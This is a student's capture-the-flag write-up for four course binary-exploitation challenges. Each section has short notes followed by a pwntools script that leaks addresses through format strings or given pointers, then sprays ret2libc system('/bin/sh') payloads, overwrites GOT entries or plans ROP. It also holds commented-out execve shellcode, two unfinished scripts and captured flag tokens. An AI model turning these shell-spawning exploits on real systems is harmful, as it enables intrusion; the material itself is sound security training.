crypto3
===================================
Flag: 
General overview of problems faced
--------------------------------------
ASLR is on but there is a format string vulnerability that allows us to leak address from the stack.
No win function.
There are potential base addresses with the format string vuln. It is likely the base address of the libc and binary
Further investigation reveals they are not the base addresses, but using vmmap, we can calculate the base using offsets.
We may be able to determine the libc version through leaked library functions.
With format strings, we may be able to overwrite something.
Script/Command used
----------------------------------------
```
#!/usr/bin/env python
# -*- coding: utf-8 -*-
# This exploit template was generated via:
# $ pwn template
from pwn import *

# Set up pwntools for the correct architecture
context.update(arch='i386')
exe = './crypto3' #Change this

PROGNAME = exe
REMOTE = "comp6447.wtf" #Change this
REMOTEPORT = 10997 #Change this
global p
global e
global global_timeout

e = ELF(PROGNAME)

# Many built-in settings can be controlled on the command-line and show up
# in "args".  For example, to dump all data sent/received, and disable ASLR
# for all created processes...
# ./exploit.py DEBUG NOASLR


def start(argv=[], *a, **kw):
    '''Start the exploit against the target.'''
    if args.GDB:
        return gdb.debug([exe] + argv, gdbscript=gdbscript, *a, **kw)
    else:
        return process([exe] + argv, *a, **kw)

# Specify your GDB script here for debugging
# GDB will be launched if the exploit is run via e.g.
# ./exploit.py GDB
gdbscript = '''
continue
'''.format(**locals())

if args.REMOTE:
    global_timeout = 3
    p = remote(REMOTE, REMOTEPORT)
else:
    global_timeout = 0.5
    p = process(PROGNAME)
    p = start()
#===========================================================
#                    EXPLOIT GOES HERE
#===========================================================
def create(bytes):
    p.recvuntil(b"refresh): ", drop=True)
    p.sendline(b'c')
    p.recvuntil(b"255): ", drop=True)
    p.sendline(bytes)

def list():
    p.recvuntil(b"): ", drop=True)
    p.sendline(b'l')

def delete():
    p.recvuntil(b"): ", drop=True)
    p.sendline(b'd')

# Buffer starts at 12th argument of %x

payload = b'aaaa' + b'%x '*0x10
create(payload)
list()
p.recvuntil(b"aaaa", drop=True)
leaks = p.recvline()
p.recvline()
log.info(f"leaks @ {leaks}")
# This is also the GOT??
libc_base = leaks[27:35]
libc_base = int(libc_base, 16)
libc_base = libc_base - 0x1D8000
log.info(f"libc base @ {hex(libc_base)}")
# This is actually the GOT
binary_base = leaks[36:44]
binary_base = int(binary_base, 16)
binary_base = binary_base - 0x4000
log.info(f"binary base @ {hex(binary_base)}")

libc_system = libc_base + 0x03d200
libc_binsh = libc_base + 0x17e0cf

p.interactive()

```

bsl
======================================
Flag: FLAG{eyJhbGciOiJIUzI1NiJ9.eyJjaGFsIjoiNy1ic2wiLCJpcCI6IjQ5LjE4MS4zNC45MCIsInNlc3Npb24iOiI5ZmFkZjA0Yi02ODRhLTRmMDQtYjE3MC04NGZkOWI3MDMxMGUifQ.juewMO0gK-9qZc5fbRAE-k3sU6J3LYNPA2ehlNhwx-k}
General overview of problems faced
----------------------------------------------
ASLR on but we have leaks for a library function and get_number() binary function.
We can determine the binary base using the given get_number() function address provided.
No win function, but no NX stack, so shellcode a possibility.
We can overwrite ebx but what do we overwrite with.
Getting segfaults with my attempts.
Fgets places a null terminator at the end of the number of bytes to be read. This means that the last byte of the eip will be overwritten with 0x00 if we fill the entire buffer.
We can spray our ret2libc in the buffer in most fav.
Need to make sure to align to 0x10 bytes so add in 9 junk bytes for alignment.
Script/Command used
-------------------------------------
```
#!/usr/bin/env python
# -*- coding: utf-8 -*-
# This exploit template was generated via:
# $ pwn template
from pwn import *

# Set up pwntools for the correct architecture
context.update(arch='i386')
exe = './bsl' #Change this

PROGNAME = exe
REMOTE = "comp6447.wtf" #Change this
REMOTEPORT = 7230 #Change this
global p
global e
global global_timeout

e = ELF(PROGNAME)

# Many built-in settings can be controlled on the command-line and show up
# in "args".  For example, to dump all data sent/received, and disable ASLR
# for all created processes...
# ./exploit.py DEBUG NOASLR


def start(argv=[], *a, **kw):
    '''Start the exploit against the target.'''
    if args.GDB:
        return gdb.debug([exe] + argv, gdbscript=gdbscript, *a, **kw)
    else:
        return process([exe] + argv, *a, **kw)

# Specify your GDB script here for debugging
# GDB will be launched if the exploit is run via e.g.
# ./exploit.py GDB
gdbscript = '''
continue
'''.format(**locals())

if args.REMOTE:
    global_timeout = 3
    p = remote(REMOTE, REMOTEPORT)
    libc = ELF('/lib/i386-linux-gnu/libc-2.27.so')
    puts_offset = 0x067b40
else:
    global_timeout = 0.5
    p = process(PROGNAME)
    p = start()
    libc = ELF('/lib/i386-linux-gnu/libc-2.27.so')
    puts_offset = 0xf7d6dca0-0xf7d06000
#===========================================================
#                    EXPLOIT GOES HERE
#===========================================================
# FIrst address leaked is where the puts function is
# most_fav() writes in a memory region zero'd out
# by memset perhaps shellcode here.
# Least favourite number leaks the function address of get_number()
# May be able to overwrite ebx (originally GOT)
# Offset of get_number() is 0x713
# puts can take in ebx-0x2204
#my_assembly ="""
#xor ecx, ecx
#mul ecx

#mov eax, 0xb
#push 0x68732f2f
#push 0x6e69622f
#mov ebx, esp
#int 0x80
#"""
#shellcode1 = asm(my_assembly)
#nopsled = """
#nop
#"""
#shellcode2 = asm(nopsled)

p.recvuntil(b"(y/n)", drop=True)
p.sendline(b'y')
p.recvuntil(b"is: ", drop=True)
leak_puts = p.recvline()
log.info(f"puts is @ {leak_puts}")

# puts last 3 bytes: b40 for remote
# offset of libc for remote is 0x067b40
# libc 2.27
libc_base = int(leak_puts, 16) - puts_offset
libc.address = libc_base
log.info(f"libc base @ {hex(libc_base)}")
# For local ==============================
#libc_system = libc.symbols["system"]
#libc_binsh = next(libc.search(b'/bin/sh\00'))
#assert(libc_binsh is not None)
# For remote ======================================
libc_system = libc_base + 0x03d200
libc_binsh = libc_base + 0x17e0cf

return_addr_junk = p32(0)
spray = return_addr_junk + p32(libc_system) + return_addr_junk + p32(libc_binsh)
align = b'a'*9
most_fav = align + spray*0x52

p.recvuntil(b"(y/n)", drop=True)
p.sendline(b'y')
p.recvuntil(b"number?", drop=True)
p.sendline(b'0')
p.recvuntil(b"fact!", drop=True)
payload = most_fav
p.sendline(payload)

p.recvuntil(b"(y/n)", drop=True)
p.sendline(b'y')

p.recvuntil(b"is: ", drop=True)
leak_get_number = p.recvline()
log.info(f"get_number is @ {leak_get_number}")
p.recvuntil(b"yours?", drop=True)
p.sendline(b'a')

binary_base = int(leak_get_number, 16) - int(0x713)
log.info(f"binary base at: {hex(binary_base)}")

p.recvuntil(b"not?", drop=True)
# ebx -> 'baac'
offset = cyclic_find("baac")
log.info(f"ebx @ {offset} with buffer size {int(0xd1)}")
address = p32(binary_base + 0x2fb4)

least_fav = spray*(int(offset/len(payload))) 
payload = fit({
    0: spray,
    offset: address + b'n'*10
})

p.sendline(payload)
p.interactive()
```

abs
====================================
Flag: FLAG{eyJhbGciOiJIUzI1NiJ9.eyJjaGFsIjoiNy1hYnMiLCJpcCI6IjQ5LjE4MS4zNC45MCIsInNlc3Npb24iOiI4ZDU0MzNkMS1kNDFiLTQ3ZTQtOWEwNC04ODRjOWY3NmM0NGUifQ.zLUq4clkvHHV6ocxthuGAX7Y9clV52POVr5L4CiJfkQ}
General overview of problems faced
--------------------------------------
We cannot go out of bounds directly.
However, we may be able to overflow the integer since the program adds 1 to our input before checking it is not greater than 3.
int8 has a max value 127 and min value -128.
Eventually, we run into a place where we can overwrite eax. This seems to control what gets printed.
Overwrite the eax with the address to our buf filled with some %x's to print stuff from the stack.
 Alternatively, our buf is technically located at all_the_abs[4], so placing the address of our buf at 123*24 chars in would do the same thing.
 We can use this offset + 4*x where x can be 1-4, to place addresses of our choosing.
 However, since the GOT and our win share the same binary, we can do a partial overwrite with $hn to overwrite the last four bytes.
 Replace the last four bytes of the exit function pointer of the GOT with our win function's last four bytes to pop the shell.

Script/Command used
--------------------------------------
```
#!/usr/bin/env python
# -*- coding: utf-8 -*-
# This exploit template was generated via:
# $ pwn template
from pwn import *

# Set up pwntools for the correct architecture
context.update(arch='i386')
exe = './abs' #Change this

PROGNAME = exe
REMOTE = "comp6447.wtf" #Change this
REMOTEPORT = 29694 #Change this
global p
global e
global global_timeout

e = ELF(PROGNAME)

# Many built-in settings can be controlled on the command-line and show up
# in "args".  For example, to dump all data sent/received, and disable ASLR
# for all created processes...
# ./exploit.py DEBUG NOASLR


def start(argv=[], *a, **kw):
    '''Start the exploit against the target.'''
    if args.GDB:
        return gdb.debug([exe] + argv, gdbscript=gdbscript, *a, **kw)
    else:
        return process([exe] + argv, *a, **kw)

# Specify your GDB script here for debugging
# GDB will be launched if the exploit is run via e.g.
# ./exploit.py GDB
gdbscript = '''
continue
'''.format(**locals())

if args.REMOTE:
    global_timeout = 3
    p = remote(REMOTE, REMOTEPORT)
else:
    global_timeout = 0.5
    p = process(PROGNAME)
    p = start()
#===========================================================
#                    EXPLOIT GOES HERE
#===========================================================
win = p32(0x80491d6)
index = 123*24
address = p32(0x804c1c0)
# GOT @ %50x @ 804c000
# main @ %55x 
payload = b'127'
#partial_win = 0x91d6-len(payload)
#payload += f'%{partial_win}x%55$hn'.encode()
#payload += cyclic(3000)
#eax_offset = cyclic_find("abdk")
# eax @ dnab
#eax_offset = cyclic_find("dnab")

#log.info(f"eax change at input: {eax_offset}")
#index_offset = index - len(payload)
#payload += fit({
#    3: b"%x "*950,
#    eax_offset: address,
#    index_offset: win*6
#})
#=======================================
partial_overwrite = 0x91d6 - len(payload)
payload += f"%{partial_overwrite}x%1$hn".encode()
offset = index - len(payload)
payload += fit({
    0: b"%x "*100,
    offset: address,
    offset + 4: 0x804c020
})
p.recvuntil(b"[0-3]: ", drop=True)
p.sendline(payload)

p.interactive()

```

piv_it
=========================================
Flag: 
General overview of problems faced
--------------------------------------------
ASLR on but we are given a library function address for printf and a binary function address for main(). 
We will be able to calculate the binary base and libc version and base.
There is an opportunity to overflow one of the buffers. A cyclic input reveals that we can overwrite the ebx, ebp, esp and eip.
NX is on so we may need to rop and use gadgets.
Script/Command
------------------------------------------
```
#!/usr/bin/env python
# -*- coding: utf-8 -*-
# This exploit template was generated via:
# $ pwn template
from pwn import *

# Set up pwntools for the correct architecture
context.update(arch='i386')
exe = './piv_it' #Change this

PROGNAME = exe
REMOTE = "comp6447.wtf" #Change this
REMOTEPORT = 5855 #Change this
global p
global e
global global_timeout

e = ELF(PROGNAME)

# Many built-in settings can be controlled on the command-line and show up
# in "args".  For example, to dump all data sent/received, and disable ASLR
# for all created processes...
# ./exploit.py DEBUG NOASLR


def start(argv=[], *a, **kw):
    '''Start the exploit against the target.'''
    if args.GDB:
        return gdb.debug([exe] + argv, gdbscript=gdbscript, *a, **kw)
    else:
        return process([exe] + argv, *a, **kw)

# Specify your GDB script here for debugging
# GDB will be launched if the exploit is run via e.g.
# ./exploit.py GDB
gdbscript = '''
continue
'''.format(**locals())

if args.REMOTE:
    global_timeout = 3
    p = remote(REMOTE, REMOTEPORT)
else:
    global_timeout = 0.5
    p = process(PROGNAME)
    p = start()
#===========================================================
#                    EXPLOIT GOES HERE
#===========================================================
p.recvuntil(b"At: ", drop = True)
leak_printf = p.recvline()
log.info(f"printf @ {leak_printf}")
p.recvuntil(b"$ ", drop=True)
#read(0, buf, 0x80), no overflow
payload = b'a'
p.sendline(payload)
p.recvuntil(b"At: ", drop=True)
leak_main = p.recvline()
log.info(f"main @ {leak_main}")

binary_base = hex(int(leak_main, 16) - int(0x725))
log.info(f"binary base @ {binary_base}")

p.recvuntil(b"$ ", drop=True)
# read (0, buf, 0x38), buf @ frame offset -20
# can overflow
# payload = cyclic(int(0x38))
# ebx @ gaaa
# ebp @ haaa
# esp @ jaaa
# eip @ laaa

ebx_offset = cyclic_find("gaaa")
ebp_offset = cyclic_find("haaa")
esp_offset = cyclic_find("jaaa")
eip_offset = cyclic_find("laaa")

payload = fit({

})
p.sendline(payload)
p.interactive()

```
